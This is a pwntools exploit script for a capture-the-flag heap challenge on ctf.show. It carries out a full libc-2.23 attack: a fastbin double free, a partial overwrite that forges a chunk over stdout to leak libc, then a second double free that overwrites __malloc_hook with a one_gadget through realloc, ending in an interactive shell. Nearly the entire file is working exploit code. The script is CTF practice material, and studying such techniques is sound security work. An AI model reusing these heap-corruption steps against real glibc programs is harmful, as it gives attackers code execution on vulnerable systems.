from pathlib import Path

from pwn import *


ROOT = Path(__file__).resolve().parent
HOST = "pwn.challenge.ctf.show"
PORT = 28186

context.arch = "amd64"
context.os = "linux"
context.log_level = "info"


def load_libc():
    candidates = [
        ROOT / "libc-2.23.so",
    ]
    for path in candidates:
        if path.exists():
            log.info(f"using libc: {path}")
            return ELF(str(path), checksec=False)
    raise FileNotFoundError(
        "No libc file found. Put libc.so.6 in pwn162/ or reuse pwn161/libc-2.23.so."
    )


elf = ELF(str(ROOT / "pwn"), checksec=False)
libc = load_libc()


def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(str(elf.path))


io = start()

if args.GDB and not args.REMOTE:
    gdb.attach(io)


def cmd(choice):
    io.recvuntil(b"Your choice : ")
    io.sendline(str(choice).encode())


def add(size, data, message=b"xxxx"):
    cmd(1)
    io.recvuntil(b"name: ")
    io.sendline(str(size).encode())
    io.recvuntil(b"name:")
    io.send(data)
    io.recvuntil(b"message:")
    io.sendline(message)


def delete(index):
    cmd(3)
    io.recvuntil(b"index:")
    io.sendline(str(index).encode())


# _IO_2_1_stdout_ - 0x43 = 0x3c55dd, so we only need to patch the low 2 bytes.
stdout_partial = p16(0x55DD)

log.info("stage 1: heap layout")
add(0x20, b"AAAA")  # idx 0: free later so the next note struct can reuse this 0x30 chunk
add(0x68, b"BBBB")  # idx 1: one node used in fastbin dup
add(0x68, b"CCCC")  # idx 2: the other fastbin node
add(0x7F, b"DDDD")  # idx 3: free into unsorted bin
add(0x18, b"EEEE")  # idx 4: barrier to avoid top-chunk consolidation

log.info("stage 2: plant stdout pointer inside an unsorted-bin split chunk")
delete(0)
delete(3)
add(0x60, stdout_partial)

log.info("stage 3: fastbin dup -> take back the forged chunk")
delete(1)
delete(2)
delete(1)
add(0x68, b"\xD0")
add(0x68, b"\xD0")
add(0x68, b"\xD0")
add(0x68, b"\xD0")

log.info("stage 4: allocate over stdout and leak libc")
fake_stdout = b"A" * 0x33 + p64(0xFBAD1800) + p64(0) * 3 + p8(0)
cmd(1)
io.recvuntil(b"name: ")
io.sendline(b"104")
io.recvuntil(b"name:")
io.send(fake_stdout)
io.recvuntil(b"A" * 32)
io.recv(8 * 4)
leak = u64(io.recv(6).ljust(8, b"\x00"))
io.recvuntil(b"message:")
io.sendline(b"xxxx")

libc_base = leak - 0x3C5600
malloc_hook = libc_base + libc.sym["__malloc_hook"]
realloc = libc_base + libc.sym["realloc"]
one_gadget = libc_base + 0x4526A

log.success(f"leak        = {hex(leak)}")
log.success(f"libc_base   = {hex(libc_base)}")
log.success(f"malloc_hook = {hex(malloc_hook)}")
log.success(f"realloc     = {hex(realloc)}")
log.success(f"one_gadget  = {hex(one_gadget)}")

log.info("stage 5: second fastbin dup -> target malloc_hook")
delete(1)
delete(2)
delete(1)
add(0x68, p64(malloc_hook - 0x23))
add(0x68, b"FFFF")
add(0x68, b"GGGG")

# Returned user pointer = malloc_hook - 0x13.
# Put one_gadget on __realloc_hook and realloc+0xd on __malloc_hook.
hook_payload = b"A" * (0x13 - 8) + p64(one_gadget) + p64(realloc + 0xD)
add(0x68, hook_payload)

log.info("stage 6: trigger malloc -> __malloc_hook")
# Option 1 enters add() in the binary and immediately calls malloc(0x28),
# so sending the menu choice is enough to hit our overwritten hook.
cmd(1)
io.interactive()
